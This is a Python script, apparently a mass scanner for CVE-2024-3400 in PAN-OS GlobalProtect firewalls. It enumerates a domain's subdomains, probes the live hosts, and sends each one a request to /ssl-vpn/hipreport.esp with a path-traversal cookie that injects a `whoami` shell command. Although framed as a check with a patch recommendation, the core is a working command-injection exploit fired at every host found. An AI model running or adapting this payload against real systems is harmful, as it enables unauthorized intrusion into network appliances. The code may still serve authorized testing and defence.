#!/usr/bin/env python3
import sys
import subprocess
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_info(msg):
    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")

def print_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def print_error(msg):
    print(f"{Colors.RED}[-]{Colors.END} {msg}")

def print_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

def print_vulnerable(msg):
    print(f"{Colors.RED}{Colors.BOLD}[!] VULNERABLE: {msg}{Colors.END}")

def run_httpx_scan(subdomains):
    """Use httpx to efficiently scan for active hosts and open ports"""
    print_info("Running httpx to identify active hosts...")
    
    with open('temp_domains.txt', 'w') as f:
        for domain in subdomains:
            f.write(f"{domain}\n")
    
    try:
        cmd = [
            'httpx',
            '-l', 'temp_domains.txt',
            '-ports', '80,443,4443,8443',
            '-status-code',
            '-title',
            '-tech-detect',
            '-follow-redirects',
            '-silent'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        active_hosts = []
        
        for line in result.stdout.splitlines():
            if line.strip():
                url = line.split()[0]
                active_hosts.append(url)
        
        return active_hosts
    
    except FileNotFoundError:
        print_error("httpx not found. Please install httpx.")
        sys.exit(1)
    finally:
        subprocess.run(['rm', '-f', 'temp_domains.txt'])

def check_vulnerability(target: str) -> bool:
    """Check if target is vulnerable to CVE-2024-3400"""
    uri = "/ssl-vpn/hipreport.esp"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": f"SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/attack782`whoami`"
    }
    
    try:
        r = requests.post(f"{target}{uri}", verify=False, headers=headers, timeout=10)
        return "Success" in r.text
    except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
        print_error(f"Request failed for {target}: {e}")
        return False

def enumerate_subdomains(domain):
    """Use subfinder to enumerate subdomains"""
    print_info(f"Enumerating subdomains for {domain}")
    try:
        result = subprocess.run(['subfinder', '-d', domain], capture_output=True, text=True)
        return [line.strip() for line in result.stdout.splitlines() if line.strip()]
    except FileNotFoundError:
        print_error("subfinder not found. Please install subfinder.")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description='CVE-2024-3400 PAN-OS Vulnerability Scanner with httpx')
    parser.add_argument('-d', '--domain', help='Target domain to scan', required=True)
    parser.add_argument('-f', '--file', help='File containing list of subdomains (optional)')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    print(f"""
{Colors.BOLD}{Colors.CYAN}CVE-2024-3400 PAN-OS Vulnerability Scanner{Colors.END}
{Colors.YELLOW}Affects: PAN-OS versions < 11.1.2-h3
Impact: Command Injection and Arbitrary File Creation{Colors.END}
    """)
    
    # Get subdomains either from file or enumeration
    if args.file:
        try:
            with open(args.file, 'r') as f:
                subdomains = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print_error(f"Subdomains file {args.file} not found")
            sys.exit(1)
    else:
        subdomains = enumerate_subdomains(args.domain)
    
    print_success(f"Found {len(subdomains)} subdomains")
    
    # Use httpx to identify active hosts
    print_info("Scanning for active hosts with httpx...")
    active_hosts = run_httpx_scan(subdomains)
    print_success(f"Found {len(active_hosts)} active hosts")
    
    # Check active hosts for vulnerability
    vulnerable_hosts = []
    for host in active_hosts:
        print_info(f"Checking {host}")
        if check_vulnerability(host):
            print_vulnerable(host)
            vulnerable_hosts.append(host)
        else:
            print_error(f"Not vulnerable: {host}")
    
    # Print summary
    print(f"\n{Colors.BOLD}=== Scan Summary ==={Colors.END}")
    print(f"{Colors.CYAN}Total subdomains:{Colors.END} {len(subdomains)}")
    print(f"{Colors.CYAN}Active hosts:{Colors.END} {len(active_hosts)}")
    print(f"{Colors.CYAN}Vulnerable hosts:{Colors.END} {Colors.RED}{len(vulnerable_hosts)}{Colors.END}")
    
    if vulnerable_hosts:
        print(f"\n{Colors.RED}{Colors.BOLD}Vulnerable hosts:{Colors.END}")
        for host in vulnerable_hosts:
            print(f"{Colors.RED}- {host}{Colors.END}")
        print(f"\n{Colors.RED}{Colors.BOLD}[!] These hosts are potentially vulnerable to CVE-2024-3400{Colors.END}")
        print(f"{Colors.YELLOW}[!] Recommendation: Upgrade to PAN-OS version 11.1.2-h3 or later immediately{Colors.END}")

if __name__ == "__main__":
    main()
